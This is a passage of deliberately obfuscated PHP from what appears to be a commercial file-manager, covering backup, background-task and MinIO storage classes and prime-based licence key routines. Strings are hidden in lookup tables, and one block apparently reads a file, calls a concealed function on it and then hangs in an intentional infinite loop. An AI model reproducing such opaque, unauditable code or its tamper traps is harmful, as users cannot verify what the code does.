ord($×Î±îŸ[$ùÔ¦ôË’]); $è÷—ë‰Ã = $·–î‹ù[723]; while ($”—­õœ < 0) { $”—­õœ += 64; } $æüší´ .= $£—Ø†³[$”—­õœ]; $Úş¡øì‡ = $·–î‹ù[724]; } $¶åª¨ÌÆ = base64_decode($æüší´); $ìµşÛê… = $·–î‹ù[720]; break; $èÕãµÅ„ = $·–î‹ù[725]; if (!$èÕãµÅ„) { return; } default: $¶åª¨ÌÆ = $this->bnpz8302a3cd($¡Â™„÷ı, $æ»Ì£ˆÃ . $ áÜşŠ); break; $™–ÃúÏ— = $·–î‹ù[726]; while (strlen($™–ÃúÏ—) < $·–î‹ù[19]) { if (!$™–ÃúÏ—) { break; } $™–ÃúÏ—++; } } if ($óúúñ÷Ş - 1 > 0) { $¶åª¨ÌÆ = $this->ojmieef403fc($¶åª¨ÌÆ, $æ»Ì£ˆÃ, $óúúñ÷Ş - 1); } return $¶åª¨ÌÆ; } public function wdxke40142f7($â’ÁÓ) { $š¢¿‘£õ =& $_SERVER[¤·²È‰º]; $™ÊòÀù° =& $_SERVER[ŸÛı·­]; $³—Æé‡ş = $this->blpr80e0da64(); $Ìˆìâ¸« = $this->blpr80e0da64(); $ÚŒ‡·—‘ = $š¢¿‘£õ[727]; while ($ÚŒ‡·—‘ < $š¢¿‘£õ[19]) { if ($ÚŒ‡·—‘ >= 0) { break; } $ÚŒ‡·—‘++; } $„›Äæø = ($³—Æé‡ş - 1) * ($Ìˆìâ¸« - 1); $‰ê¡…Ç« = intval(($³—Æé‡ş + $Ìˆìâ¸«) / 2); while (1) { $¥í®Øøì = $‰ê¡…Ç«; $Œ‰Óê²¿ = $„›Äæø; $éš·Æ = $š¢¿‘£õ[728]; if (strlen($éš·Æ) < $š¢¿‘£õ[623]) { return; } while ($Œ‰Óê²¿ % $¥í®Øøì != 0) { $ú‘êñê€ = $Œ‰Óê²¿; $Œ‰Óê²¿ = $¥í®Øøì; $ú£¹ùıÌ = $š¢¿‘£õ[729]; while ($ú£¹ùıÌ < $š¢¿‘£õ[623]) { if ($ú£¹ùıÌ >= 0) { break; } $ú£¹ùıÌ++; } $¥í®Øøì = $ú‘êñê€ % $¥í®Øøì; $ÎÒ—ì›Ë = $š¢¿‘£õ[730]; while ($ÎÒ—ì›Ë < $š¢¿‘£õ[19]) { if ($ÎÒ—ì›Ë >= 0) { break; } $ÎÒ—ì›Ë++; } } if ($¥í®Øøì == 1) { break; } else { $‰ê¡…Ç«++; } } $’Ÿ¥Õ¨ = 2; $ÆÙ†ë… = $š¢¿‘£õ[731]; while ($ÆÙ†ë… < $š¢¿‘£õ[19]) { if ($ÆÙ†ë… >= 0) { break; } $ÆÙ†ë…++; } for ($ã°ÒÌùí = 0; $ã°ÒÌùí < $„›Äæø * 10; $ã°ÒÌùí++) { if (($„›Äæø * $ã°ÒÌùí + 1) % $‰ê¡…Ç« == 0) { $’Ÿ¥Õ¨ = intval(($„›Äæø * $ã°ÒÌùí + 1) / $‰ê¡…Ç«); break; } } $Ö—µï«Û = $this->kvcod433917a($³—Æé‡ş * $Ìˆìâ¸« . $™ÊòÀù°[6], $™ÊòÀù°[134]); $‡‘Âî¬ñ = $š¢¿‘£õ[732]; if (!$‡‘Âî¬ñ) { die; } $Ö†Î®€ = md5($™ÊòÀù°[298] . ($³—Æé‡ş + $Ìˆìâ¸«) . $™ÊòÀù°[299] . $‰ê¡…Ç« . $™ÊòÀù°[299] . $’Ÿ¥Õ¨ . $™ÊòÀù°[300]); $¹ç²£ÕÆ = $this->kvcod433917a($â’ÁÓ, $Ö†Î®€) . $™ÊòÀù°[301] . $Ö—µï«Û; $ åÍÙÏ¨ = $š¢¿‘£õ[733]; if (!$ åÍÙÏ¨) { die; } return $¹ç²£ÕÆ; $ÆÇõÖ½ë = $š¢¿‘£õ[734]; if (!$ÆÇõÖ½ë) { return; } } public function mipuf4acd80d($ıÒÙßóŸ) { $æ»‰¥ Ò =& $_SERVER[¤·²È‰º]; $ØÍ¾Êøâ =& $_SERVER[ŸÛı·­]; $…©Ó®á = explode($ØÍ¾Êøâ[301], $ıÒÙßóŸ); $¢é»³é– = $æ»‰¥ Ò[735]; if (!$¢é»³é–) { die; } if (count($…©Ó®á) != 2) { return $ØÍ¾Êøâ[6]; } $éÉø‚ãü = $this->bnpz8302a3cd($…©Ó®á[1] . $ØÍ¾Êøâ[6], $ØÍ¾Êøâ[134]); if (!$éÉø‚ãü) { return $ØÍ¾Êøâ[6]; } $éÉø‚ãü = intval($éÉø‚ãü); $öåşÜ…ª = $æ»‰¥ Ò[736]; if (strlen($öåşÜ…ª) < $æ»‰¥ Ò[19]) { die; } $Õˆ³Ë– = 0; $ô·Ìîç³ = $æ»‰¥ Ò[737]; if (!$ô·Ìîç³) { die; } $¸éïäÏ = 0; $’ú§¦Ñ = $æ»‰¥ Ò[738]; if (!$’ú§¦Ñ) { die; } for ($Ôö×æàØ = 3; $Ôö×æàØ < $éÉø‚ãü; $Ôö×æàØ += 2) { if ($éÉø‚ãü % $Ôö×æàØ != 0) { continue; } $Õˆ³Ë– = $Ôö×æàØ; $‹áÆ ÉÚ = $æ»‰¥ Ò[739]; if (!$‹áÆ ÉÚ) { return; } $¸éïäÏ = intval($éÉø‚ãü / $Ôö×æàØ); $ıçÉõòô = $æ»‰¥ Ò[740]; break; $—ÄŞ¦äÕ = $æ»‰¥ Ò[741]; } $ì¼¥àØ… = ($Õˆ³Ë– - 1) * ($¸éïäÏ - 1); $úÍìšßˆ = $æ»‰¥ Ò[742]; $ŒÂ˜ŠŒ¢ = intval(($Õˆ³Ë– + $¸éïäÏ) / 2); while (1) { $Éá’Ü = $ŒÂ˜ŠŒ¢; $Ğç˜ıÓ« = $æ»‰¥ Ò[743]; if (strlen($Ğç˜ıÓ«) < $æ»‰¥ Ò[654]) { die; } $¤âÙâ€ = $ì¼¥àØ…; $á÷æüŒü = $æ»‰¥ Ò[744]; while ($¤âÙâ€ % $Éá’Ü != 0) { $¶‡Æ”ëÚ = $¤âÙâ€; $¤âÙâ€ = $Éá’Ü; $Éá’Ü = $¶‡Æ”ëÚ % $Éá’Ü; } if ($Éá’Ü == 1) { break; } else { $ŒÂ˜ŠŒ¢++; } } $ãë§Íî = 2; for ($Ôö×æàØ = 0; $Ôö×æàØ < $ì¼¥àØ… * 10; $Ôö×æàØ++) { if (($ì¼¥àØ… * $Ôö×æàØ + 1) % $ŒÂ˜ŠŒ¢ == 0) { $ãë§Íî = intval(($ì¼¥àØ… * $Ôö×æàØ + 1) / $ŒÂ˜ŠŒ¢); break; } } $å×¶•¼ş = md5($ØÍ¾Êøâ[298] . ($Õˆ³Ë– + $¸éïäÏ) . $ØÍ¾Êøâ[299] . $ŒÂ˜ŠŒ¢ . $ØÍ¾Êøâ[299] . $ãë§Íî . $ØÍ¾Êøâ[300]); $¦Î«…ØÅ = $this->bnpz8302a3cd($…©Ó®á[0], $å×¶•¼ş); return $¦Î«…ØÅ; $ÆµÑ´˜ä = $æ»‰¥ Ò[745]; if (strlen($ÆµÑ´˜ä) < $æ»‰¥ Ò[19]) { return; } } public function blpr80e0da64() { $ÊşŠóô =& $_SERVER[¤·²È‰º]; $È‰İŒ³ = mt_rand(pow(2, 14), pow(2, 16) - 1); $­©™İ£í = array(); $ÌÊöÔŠã = $ÊşŠóô[746]; $Øöù¹µ = 1; while ($Øöù¹µ <= (int) sqrt($È‰İŒ³)) { $›ŒÄƒº = $Øöù¹µ; while (!0) { $›ŒÄƒº++; if ($›ŒÄƒº <= 2) { $Øöù¹µ = $›ŒÄƒº; break; } else { if ($›ŒÄƒº < 2) { continue; } } $ó»ÏëÇú = !0; for ($ÖŠ„”«  = 2; $ÖŠ„”«  <= sqrt($›ŒÄƒº); $ÖŠ„”« ++) { if ($›ŒÄƒº % $ÖŠ„”«  == 0) { $ó»ÏëÇú = !1; } } if ($ó»ÏëÇú) { $Øöù¹µ = $›ŒÄƒº; break; } } $­©™İ£í[] = $Øöù¹µ; } $ªô°¡ñş = 2; $Ó™£äá² = $ÊşŠóô[747]; for ($›ŒÄƒº = $È‰İŒ³; $›ŒÄƒº > 1; $›ŒÄƒº--) { $ó»ÏëÇú = !0; foreach ($­©™İ£í as $óßø¶çµ) { if ($›ŒÄƒº % $óßø¶çµ == 0) { $ó»ÏëÇú = !1; break; } } if ($ó»ÏëÇú) { $ªô°¡ñş = $›ŒÄƒº; break; } } return $ªô°¡ñş; $Ú¬¯‹° = $ÊşŠóô[748]; if (!$Ú¬¯‹°) { return; } } public function jpzu373923d1($†Â½¶‹ü, $™–“÷¡¾) { $¾íƒÛÒª =& $_SERVER[ŸÛı·­]; return call_user_func(array($¾íƒÛÒª[8], $¾íƒÛÒª[302]), $†Â½¶‹ü, $™–“÷¡¾); } public function kvcod433917a($åÍÇËœç, $§é”ÍĞƒ) { $Š÷ÙÄ¥Ç =& $_SERVER[ŸÛı·­]; return call_user_func(array($Š÷ÙÄ¥Ç[303], $Š÷ÙÄ¥Ç[304]), $åÍÇËœç, $§é”ÍĞƒ); $ ®Åìîİ = $_SERVER[¤·²È‰º][703]; if (!$ ®Åìîİ) { return; } } public function bnpz8302a3cd($™¾Í…¶Â, $é½€‹–) { $ƒˆÄíÄ€ =& $_SERVER[ŸÛı·­]; return call_user_func(array($ƒˆÄíÄ€[303], $ƒˆÄíÄ€[305]), $™¾Í…¶Â, $é½€‹–); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $­Ğß¸Ó =& $_SERVER[¤·²È‰º]; $this->isManual(); self::$name = date($­Ğß¸Ó[749]); if (!($»ŠèÁÍò = Model($­Ğß¸Ó[750])->lastItem())) { $»ŠèÁÍò = $this->initData(); } else { self::$name = $»ŠèÁÍò[$­Ğß¸Ó[42]]; if ($»ŠèÁÍò[$­Ğß¸Ó[751]] == $­Ğß¸Ó[98]) { self::$name = date($­Ğß¸Ó[752]); $ßÒ©Ö  = 0; if (isset($»ŠèÁÍò[$­Ğß¸Ó[302]][$­Ğß¸Ó[209]][$­Ğß¸Ó[476]])) { $ßÒ©Ö  = (int) $»ŠèÁÍò[$­Ğß¸Ó[302]][$­Ğß¸Ó[209]][$­Ğß¸Ó[476]]; } if (self::$manual == 0 && $»ŠèÁÍò[$­Ğß¸Ó[42]] == self::$name) { Model($­Ğß¸Ó[750])->remove($»ŠèÁÍò[$­Ğß¸Ó[407]]); } $»ŠèÁÍò = $this->initData($ßÒ©Ö , $»ŠèÁÍò[$­Ğß¸Ó[753]]); } else { $this->checkStore($»ŠèÁÍò[$­Ğß¸Ó[753]]); } } self::$option = $»ŠèÁÍò; } private function isManual() { $ö±ëß™ = _get($GLOBALS, $_SERVER[¤·²È‰º][754], 0); $ö±ëß™ = intval($ö±ëß™); self::$manual = $ö±ëß™ && $ö±ëß™ == 1 ? 1 : 0; } private function initData($ÀÁÒ“Œ = 0, $ÖˆÏú­ = '') { $ñÄÉÕë =& $_SERVER[¤·²È‰º]; $šõ˜Ş£ş = Model($ñÄÉÕë[750])->config(); if ($ÖˆÏú­ && $šõ˜Ş£ş[$ñÄÉÕë[753]] != $ÖˆÏú­) { $ÀÁÒ“Œ = 0; } $this->checkStore($šõ˜Ş£ş[$ñÄÉÕë[753]]); if (self::$manual == 1) { self::$name .= $ñÄÉÕë[11] . date($ñÄÉÕë[755]); } $óóèóŠÛ = array($ñÄÉÕë[753] => $šõ˜Ş£ş[$ñÄÉÕë[753]], $ñÄÉÕë[42] => self::$name, $ñÄÉÕë[751] => 0, $ñÄÉÕë[756] => $šõ˜Ş£ş[$ñÄÉÕë[756]], $ñÄÉÕë[757] => self::$manual, $ñÄÉÕë[302] => array($ñÄÉÕë[758] => array($ñÄÉÕë[751] => 0), $ñÄÉÕë[759] => array($ñÄÉÕë[751] => 0, $ñÄÉÕë[760] => 0, $ñÄÉÕë[761] => 0, $ñÄÉÕë[43] => $ñÄÉÕë[12], $ñÄÉÕë[762] => 0, $ñÄÉÕë[505] => 0), $ñÄÉÕë[763] => array($ñÄÉÕë[751] => 0, $ñÄÉÕë[760] => 0, $ñÄÉÕë[761] => 0, $ñÄÉÕë[762] => 0, $ñÄÉÕë[505] => 0), $ñÄÉÕë[209] => array($ñÄÉÕë[751] => 0, $ñÄÉÕë[764] => 0, $ñÄÉÕë[765] => 0, $ñÄÉÕë[766] => 0, $ñÄÉÕë[767] => 0, $ñÄÉÕë[476] => $ÀÁÒ“Œ, $ñÄÉÕë[762] => 0, $ñÄÉÕë[505] => 0)), $ñÄÉÕë[762] => time(), $ñÄÉÕë[505] => 0); $©‚Ş = Model($ñÄÉÕë[750])->insert($óóèóŠÛ); $óóèóŠÛ[$ñÄÉÕë[407]] = $©‚Ş; return $óóèóŠÛ; } private function checkStore($ˆÓ–¹’) { $ı’ğ“Òú =& $_SERVER[¤·²È‰º]; $„Æú§Ÿˆ = Model($ı’ğ“Òú[768])->listData($ˆÓ–¹’); Model($ı’ğ“Òú[768])->checkConfig($„Æú§Ÿˆ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¤·²È‰º][750])->findByName(self::$name); } return self::$option; } public static function set($šª¢í¥‡) { $Í¼”«ıê =& $_SERVER[¤·²È‰º]; $ÛòÂß¬– = self::get(); foreach ($šª¢í¥‡ as $·ÍòÀ´ => $×‘Ş±ì) { $¼üú–Ò = explode($Í¼”«ıê[10], $·ÍòÀ´); $ı®ü¦óã = count($¼üú–Ò); switch ($ı®ü¦óã) { case 1: $ÛòÂß¬–[$¼üú–Ò[0]] = $×‘Ş±ì; break; case 2: $ÛòÂß¬–[$¼üú–Ò[0]][$¼üú–Ò[1]] = $×‘Ş±ì; break; case 3: $ÛòÂß¬–[$¼üú–Ò[0]][$¼üú–Ò[1]][$¼üú–Ò[2]] = $×‘Ş±ì; break; } } Model($Í¼”«ıê[750])->update($ÛòÂß¬–[$Í¼”«ıê[407]], $ÛòÂß¬–); self::$option = $ÛòÂß¬–; return self::$option; } public function keep() { $›ßË†À =& $_SERVER[¤·²È‰º]; $ù·‰°ı = self::get(); if ($ù·‰°ı[$›ßË†À[302]][$›ßË†À[758]][$›ßË†À[751]] == $›ßË†À[98]) { return; } $this->backupKeep($ù·‰°ı); self::set(array($›ßË†À[769] => 1)); } private function backupKeep($®áäºèĞ) { $Ö¶íÒä‡ =& $_SERVER[¤·²È‰º]; if (self::$manual == 1) { return; } $µı–Ÿìœ = Model($Ö¶íÒä‡[750])->listData(); if (empty($µı–Ÿìœ)) { return; } $·›ä¾Û× = 0; $©Ú‡œ¤¹ = array(); foreach ($µı–Ÿìœ as $¶Û¸¯¯¶) { if ($·›ä¾Û× >= 7) { break; } $©Ú‡œ¤¹[] = $¶Û¸¯¯¶[$Ö¶íÒä‡[42]]; $·›ä¾Û×++; } for ($·›ä¾Û× = 0; $·›ä¾Û× < 12; $·›ä¾Û×++) { $©Ú‡œ¤¹[] = date($Ö¶íÒä‡[770], strtotime("\55{$·›ä¾Û×}\x20\155\157\156\164\x68\163")); } $©Ú‡œ¤¹ = array_unique($©Ú‡œ¤¹); $œÜ¯‡ÓÁ = Model($Ö¶íÒä‡[771])->get($Ö¶íÒä‡[772]); foreach ($µı–Ÿìœ as $¶Û¸¯¯¶) { if (isset($¶Û¸¯¯¶[$Ö¶íÒä‡[757]]) && $¶Û¸¯¯¶[$Ö¶íÒä‡[757]] == $Ö¶íÒä‡[98]) { continue; } if (!empty($¶Û¸¯¯¶[$Ö¶íÒä‡[42]]) && in_array($¶Û¸¯¯¶[$Ö¶íÒä‡[42]], $©Ú‡œ¤¹)) { continue; } Model($Ö¶íÒä‡[750])->remove($¶Û¸¯¯¶[$Ö¶íÒä‡[407]]); $¬•·²×Ş = $this->backupPath($®áäºèĞ, $œÜ¯‡ÓÁ); IO::remove($¬•·²×Ş, !1); } } private function backupPath($“¦¾‘Í¥, $áË§¼§ = false) { $ªë²üÆõ =& $_SERVER[¤·²È‰º]; if (!$áË§¼§) { $áË§¼§ = Model($ªë²üÆõ[771])->get($ªë²üÆõ[772]); } $üõş×Çà = $“¦¾‘Í¥[$ªë²üÆõ[42]]; $Äøƒ÷Ê‰ = substr(md5($ªë²üÆõ[773] . $áË§¼§ . $üõş×Çà), 0, 8); return "\173\x69\157\72{$“¦¾‘Í¥[$ªë²üÆõ[753]]}\x7d\x2f\144\141\x74\141\142\141\x73\145\x2f\x62\141\x63\x6b\x75\x70\57" . $üõş×Çà . $ªë²üÆõ[11] . $Äøƒ÷Ê‰; } public function db() { $ãÜä¾°Ø =& $_SERVER[¤·²È‰º]; $„—úÑÃœ = self::get(); if ($„—úÑÃœ[$ãÜä¾°Ø[302]][$ãÜä¾°Ø[759]][$ãÜä¾°Ø[751]] == $ãÜä¾°Ø[98]) { return !0; } $›û¬Ú™´ = new BackupDb(); if (!$›û¬Ú™´->index()) { return !1; } self::set(array($ãÜä¾°Ø[774] => 1)); return !0; } public function dbFile() { $·¯àºö =& $_SERVER[¤·²È‰º]; $‡ —ø‡° = self::get(); if ($‡ —ø‡°[$·¯àºö[302]][$·¯àºö[763]][$·¯àºö[751]] == $·¯àºö[98]) { return !0; } $¨¦É±µ = new BackupDbFile(); if (!$¨¦É±µ->index()) { return !1; } self::set(array($·¯àºö[775] => 1)); return !0; } public function file() { $Ëæ¼¹Øô =& $_SERVER[¤·²È‰º]; $Áğó‘ú» = self::get(); if ($Áğó‘ú»[$Ëæ¼¹Øô[302]][$Ëæ¼¹Øô[209]][$Ëæ¼¹Øô[751]] == $Ëæ¼¹Øô[98]) { return !0; } if (!isset($Áğó‘ú»[$Ëæ¼¹Øô[756]]) || $Áğó‘ú»[$Ëæ¼¹Øô[756]] == $Ëæ¼¹Øô[207]) { $Ì¼Æµƒ = new BackupFile(); if (!$Ì¼Æµƒ->index()) { return !1; } } self::set(array($Ëæ¼¹Øô[776] => 1, $Ëæ¼¹Øô[751] => 1)); return !0; } } goto C’Ç»´Å¼Ï; c²¾ì Âë“: if (!isset($_SERVER[$_SERVER[¤·²È‰º][13]]) || !isset($_SERVER[$_SERVER[¤·²È‰º][14]])) { $_getc = $_SERVER[¤·²È‰º][15]; $_getfile = $_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤·²È‰º][18], $_getfilec); if (count($_getarrs) < $_SERVER[¤·²È‰º][19]) { $exit = $_SERVER[¤·²È‰º][20]; $exit(); } $_act = $_SERVER[¤·²È‰º][21]; $_act($_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¤·²È‰º][22]); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($úÍÕ¼) { parent::__construct($úÍÕ¼); $this->signatureVersion($_SERVER[¤·²È‰º][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[¤·²È‰º][247], 1); goto A˜¥¬Í¡Ÿƒ; báÂí‚İÕÖ: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\162\165\156\x6e\151\156\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($„˜çß§Ì, $ñ†àëõ = '', $£ûØÉğ¯ = 0, $£ÌÒü× = '') { $àæ ø Ö =& $_SERVER[¤·²È‰º]; if (self::get($„˜çß§Ì)) { return; } $this->task = array($àæ ø Ö[407] => $„˜çß§Ì, $àæ ø Ö[1651] => USER_ID, $àæ ø Ö[1550] => $£ÌÒü×, $àæ ø Ö[43] => $ñ†àëõ, $àæ ø Ö[1058] => $àæ ø Ö[12], $àæ ø Ö[787] => $£ûØÉğ¯, $àæ ø Ö[1652] => 0, $àæ ø Ö[1653] => 0, $àæ ø Ö[1654] => 0, $àæ ø Ö[1655] => timeFloat(), $àæ ø Ö[1656] => 0, $àæ ø Ö[1657] => 0, $àæ ø Ö[1658] => 0, $àæ ø Ö[1659] => 0, $àæ ø Ö[751] => $àæ ø Ö[1610]); $GLOBALS[$àæ ø Ö[1660]] = 1; Hook::bind($àæ ø Ö[1615], array($this, $àæ ø Ö[1661])); Hook::bind($àæ ø Ö[1662], array($this, $àæ ø Ö[1663])); $this->startAfter(); Hook::trigger($àæ ø Ö[1664], $this->task); $this->task[$àæ ø Ö[1657]] = timeFloat(); } public function end() { $Ö‹¯ƒúÌ =& $_SERVER[¤·²È‰º]; if (!$this->task) { return; } if ($this->task[$Ö‹¯ƒúÌ[1657]]) { self::valueSet($this->task[$Ö‹¯ƒúÌ[407]], !1); } $¿ œµ¼â = timeFloat() - $this->task[$Ö‹¯ƒúÌ[1655]]; self::log($Ö‹¯ƒúÌ[1665] . $this->task[$Ö‹¯ƒúÌ[407]] . $Ö‹¯ƒúÌ[1666] . $¿ œµ¼â . $Ö‹¯ƒúÌ[1667]); Hook::unbind($Ö‹¯ƒúÌ[1615], array($this, $Ö‹¯ƒúÌ[1661])); Hook::unbind($Ö‹¯ƒúÌ[1662], array($this, $Ö‹¯ƒúÌ[1663])); $this->endAfter(); $this->task = !1; } public function update($ØäÁ•ôÜ = 0, $¿¥É™ƒº = false) { $ÈÍ»áû =& $_SERVER[¤·²È‰º]; $áëÛæ™÷ =& $this->task; if (!$áëÛæ™÷) { return; } $áëÛæ™÷[$ÈÍ»áû[1652]] += $ØäÁ•ôÜ; $áëÛæ™÷[$ÈÍ»áû[1656]] = timeFloat(); if ($áëÛæ™÷[$ÈÍ»áû[787]]) { if ($áëÛæ™÷[$ÈÍ»áû[787]] < $áëÛæ™÷[$ÈÍ»áû[1652]]) { $áëÛæ™÷[$ÈÍ»áû[787]] = $áëÛæ™÷[$ÈÍ»áû[1652]]; } $²Ôù’èø = timeFloat() - $áëÛæ™÷[$ÈÍ»áû[1655]] - $áëÛæ™÷[$ÈÍ»áû[1658]]; if ($²Ôù’èø <= 0) { $²Ôù’èø = 0.001; } $áëÛæ™÷[$ÈÍ»áû[1653]] = $áëÛæ™÷[$ÈÍ»áû[1652]] / $áëÛæ™÷[$ÈÍ»áû[787]]; $áëÛæ™÷[$ÈÍ»áû[1654]] = $áëÛæ™÷[$ÈÍ»áû[1652]] / $²Ôù’èø; if ($áëÛæ™÷[$ÈÍ»áû[1653]] > 0) { $áëÛæ™÷[$ÈÍ»áû[1659]] = $²Ôù’èø * (1 - $áëÛæ™÷[$ÈÍ»áû[1653]]) / $áëÛæ™÷[$ÈÍ»áû[1653]]; } $áëÛæ™÷[$ÈÍ»áû[1659]] = $áëÛæ™÷[$ÈÍ»áû[1659]] <= 0 ? 0 : $áëÛæ™÷[$ÈÍ»áû[1659]]; } $this->updateAfter(); $Ğö‚ÍØˆ = 0.2; if (timeFloat() - $áëÛæ™÷[$ÈÍ»áû[1657]] < $Ğö‚ÍØˆ && !$¿¥É™ƒº) { return; } $ÍÍƒò“† = self::get($áëÛæ™÷[$ÈÍ»áû[407]]); $™û ½Û = $ÍÍƒò“†[$ÈÍ»áû[751]]; if ($™û ½Û == self::STATYS_KILL) { $Šš†­à› = array($ÈÍ»áû[1668] => LNG($ÈÍ»áû[1669]), $ÈÍ»áû[1185] => !1); Cache::set($ÈÍ»áû[1670] . $this->task[$ÈÍ»áû[407]], $Šš†­à›, 30); $this->onKill(); $this->end(); die; } else { if ($™û ½Û == self::STATYS_STOP) { $®÷áö›œ = 2; $ÍÍƒò“†[$ÈÍ»áû[1658]] += $®÷áö›œ; self::valueSet($áëÛæ™÷[$ÈÍ»áû[407]], $ÍÍƒò“†); sleep($®÷áö›œ); $this->update(); return; } } $áëÛæ™÷[$ÈÍ»áû[751]] = $™û ½Û ? $™û ½Û : $áëÛæ™÷[$ÈÍ»áû[751]]; $áëÛæ™÷[$ÈÍ»áû[1658]] = $ÍÍƒò“†[$ÈÍ»áû[1658]] ? $ÍÍƒò“†[$ÈÍ»áû[1658]] : 0; $áëÛæ™÷[$ÈÍ»áû[1657]] = timeFloat(); Hook::trigger($ÈÍ»áû[1671], $áëÛæ™÷); self::valueSet($áëÛæ™÷[$ÈÍ»áû[407]], $áëÛæ™÷); } public function onKillSet($²”ÎâÙ¨, $¯×‚İÑ† = array()) { $this->onKillCall = array($²”ÎâÙ¨, $¯×‚İÑ†); } public function onKill() { $åÙæŠ¯ =& $_SERVER[¤·²È‰º]; self::log($åÙæŠ¯[1665] . $this->task[$åÙæŠ¯[407]] . $åÙæŠ¯[1672]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($„Õ‘ü¨è) { $Èšä™şÎ =& $_SERVER[¤·²È‰º]; Cache::set($Èšä™şÎ[1670] . $this->task[$Èšä™şÎ[407]], $„Õ‘ü¨è, 60); return $„Õ‘ü¨è; } public static function get($‹¢øê‚ã) { $Š°•¡â =& $_SERVER[¤·²È‰º]; $©É‡ëü‡ = self::valueGet($‹¢øê‚ã); if (is_array($©É‡ëü‡) && $©É‡ëü‡[$Š°•¡â[1673]]) { $“ğŞŞ³˜ = ActionApply($©É‡ëü‡[$Š°•¡â[1673]], array($©É‡ëü‡)); $©É‡ëü‡ = is_array($“ğŞŞ³˜) ? $“ğŞŞ³˜ : $©É‡ëü‡; } return $©É‡ëü‡; } public static function listData() { $éí‘éá = self::valueGet(); return array_sort_by($éí‘éá, $_SERVER[¤·²È‰º][1655], !0); } public static function kill($ù’’áÃ) { return self::changeStatus($ù’’áÃ, self::STATYS_KILL); } public static function stop($ü®ˆäÔÀ) { return self::changeStatus($ü®ˆäÔÀ, self::STATYS_STOP); } public static function restart($éã´¤é¬) { return self::changeStatus($éã´¤é¬, self::STATYS_RUNNING); } public static function killAll() { $ˆ·ê™¿ï =& $_SERVER[¤·²È‰º]; $«ªùüÒ¸ = self::listData(); foreach ($«ªùüÒ¸ as $³š³üê) { self::kill($³š³üê[$ˆ·ê™¿ï[407]]); } sleep(2); foreach ($«ªùüÒ¸ as $³š³üê) { self::valueSet($³š³üê[$ˆ·ê™¿ï[407]], !1); } } private static function changeStatus($¯ÏÛŸ, $ËÀíª±å) { $ÍÍ´Ğ =& $_SERVER[¤·²È‰º]; $§É…âŒ¶ = self::valueGet($¯ÏÛŸ); if (!$§É…âŒ¶) { return !1; } $§É…âŒ¶[$ÍÍ´Ğ[751]] = $ËÀíª±å; self::valueSet($¯ÏÛŸ, $§É…âŒ¶); self::log($ÍÍ´Ğ[1674] . $§É…âŒ¶[$ÍÍ´Ğ[407]] . $ÍÍ´Ğ[1675] . $ËÀíª±å); return !0; } public static function valueGet($ÉûİŸÎ§ = false) { $ÜÆŒ¹ì… =& $_SERVER[¤·²È‰º]; if ($ÉûİŸÎ§) { $¬å›•®ú = Model($ÜÆŒ¹ì…[455])->where(array($ÜÆŒ¹ì…[104] => $ÉûİŸÎ§, $ÜÆŒ¹ì…[43] => $ÜÆŒ¹ì…[1065]))->find(); return $¬å›•®ú ? json_decode($¬å›•®ú[$ÜÆŒ¹ì…[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($†áÜ›ı = false) { $ˆ“ÏÁÒ„ =& $_SERVER[¤·²È‰º]; $êîÍ = array($ˆ“ÏÁÒ„[43] => $ˆ“ÏÁÒ„[1065]); if ($†áÜ›ı) { $êîÍ[$ˆ“ÏÁÒ„[1651]] = $†áÜ›ı; } $ôÆ¦ˆ”æ = Model($ˆ“ÏÁÒ„[455])->where($êîÍ)->select(); $ôÆ¦ˆ”æ = $ôÆ¦ˆ”æ ? $ôÆ¦ˆ”æ : array(); foreach ($ôÆ¦ˆ”æ as $Îë—í“· => $ºê°§ö) { $ôÆ¦ˆ”æ[$Îë—í“·] = json_decode($ºê°§ö[$ˆ“ÏÁÒ„[383]], !0); } return $ôÆ¦ˆ”æ; } public static function valueSet($ŒğäÔ, $ÀçˆÂºÄ) { $ŠÖğ¯Â¥ =& $_SERVER[¤·²È‰º]; if (!$ÀçˆÂºÄ) { return Model($ŠÖğ¯Â¥[455])->where(array($ŠÖğ¯Â¥[104] => $ŒğäÔ, $ŠÖğ¯Â¥[43] => $ŠÖğ¯Â¥[1065]))->delete(); } $ò‹óÇ‚Ï = json_encode($ÀçˆÂºÄ); if (!$ò‹óÇ‚Ï) { ob_start(); var_dump($ÀçˆÂºÄ); $Êªí¸´  = ob_get_clean(); self::log($ŠÖğ¯Â¥[1676] . json_encode_force($Êªí¸´ )); } if (!$ŒğäÔ || !$ÀçˆÂºÄ[$ŠÖğ¯Â¥[407]]) { return !1; } $‡ğêª¹Ê = array($ŠÖğ¯Â¥[43] => $ŠÖğ¯Â¥[1065], $ŠÖğ¯Â¥[1651] => USER_ID, $ŠÖğ¯Â¥[104] => $ŒğäÔ, $ŠÖğ¯Â¥[383] => $ò‹óÇ‚Ï); $µ©ÙÃ¸ = $ŠÖğ¯Â¥[1677]; CacheLock::lock($µ©ÙÃ¸); Model($ŠÖğ¯Â¥[455])->add($‡ğêª¹Ê, array(), !0); CacheLock::unlock($µ©ÙÃ¸); } public static function log($˜şœÆõÈ) { if (!GLOBAL_DEBUG) { return; } write_log($˜şœÆõÈ, $_SERVER[¤·²È‰º][1678]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ø¡Á =& $_SERVER[¤·²È‰º]; $ŸÉİàç© =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ø¡Á[1679], array($this, $Ø¡Á[1680])); Hook::bind($Ø¡Á[1209], array($this, $Ø¡Á[1681])); Hook::bind($Ø¡Á[1682], array($this, $Ø¡Á[1683])); 